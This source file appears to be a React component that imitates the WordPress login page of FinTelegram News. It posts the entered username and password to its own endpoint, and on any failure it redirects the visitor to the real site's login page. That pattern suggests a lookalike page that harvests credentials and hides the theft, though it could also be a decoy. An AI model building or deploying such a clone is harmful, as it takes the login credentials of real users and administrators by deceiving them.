"use client";

import { useState, FormEvent } from "react";
import Link from "next/link";
import ProxiedImage from "@/components/ProxiedImage";
import { useRouter } from "next/navigation";
import { IMAGES } from "@/lib/assets";
import { ROUTES, REAL_SITE_URLS } from "@/lib/routes";

export default function WpLoginForm() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  async function handleSubmit(e: FormEvent) {
    e.preventDefault();
    setLoading(true);
    setError("");

    try {
      const res = await fetch("/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password, remember }),
      });

      const data = await res.json();

      if (!res.ok) {
        window.location.href = data.redirect || REAL_SITE_URLS.wpLogin;
        return;
      }

      router.push(ROUTES.wpAdmin);
      router.refresh();
    } catch {
      window.location.href = REAL_SITE_URLS.wpLogin;
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="wp-login-page">
      <div id="login">
        <h1 className="wp-login-logo">
          <Link
            href="https://wordpress.org/"
            target="_blank"
            rel="noopener noreferrer"
            title="Powered by WordPress"
          >
            <ProxiedImage
              src={IMAGES.wordpressLogo}
              alt="WordPress"
              width={84}
              height={84}
              priority
            />
          </Link>
        </h1>

        {error && (
          <div
            className="wp-login-error"
            dangerouslySetInnerHTML={{
              __html: `<strong>Error:</strong> ${error} <a href="${ROUTES.wpLogin}?action=lostpassword">Lost your password?</a>`,
            }}
          />
        )}

        <form className="wp-login-form" onSubmit={handleSubmit} method="post">
          <p>
            <label htmlFor="user_login">Username or Email Address</label>
            <input
              type="text"
              name="log"
              id="user_login"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              autoComplete="username"
              required
              autoFocus
            />
          </p>
          <p>
            <label htmlFor="user_pass">Password</label>
            <input
              type="password"
              name="pwd"
              id="user_pass"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              autoComplete="current-password"
              required
            />
          </p>

          <p className="wp-login-remember">
            <input
              name="rememberme"
              type="checkbox"
              id="rememberme"
              checked={remember}
              onChange={(e) => setRemember(e.target.checked)}
            />
            <label htmlFor="rememberme">Remember Me</label>
          </p>

          <p className="submit">
            <button
              type="submit"
              name="wp-submit"
              id="wp-submit"
              className="wp-login-submit"
              disabled={loading}
            >
              {loading ? "Logging in..." : "Log In"}
            </button>
            <span className="clear" />
          </p>
        </form>

        <p className="wp-login-lost">
          <Link href={`${ROUTES.wpLogin}?action=lostpassword`}>Lost your password?</Link>
        </p>

        <p className="wp-login-back">
          <Link href={ROUTES.home}>&larr; Go to FinTelegram News</Link>
        </p>

        <p className="wp-login-powered">
          <Link href="https://wordpress.org/" target="_blank" rel="noopener noreferrer">
            Powered by WordPress
          </Link>
        </p>
      </div>
    </div>
  );
}
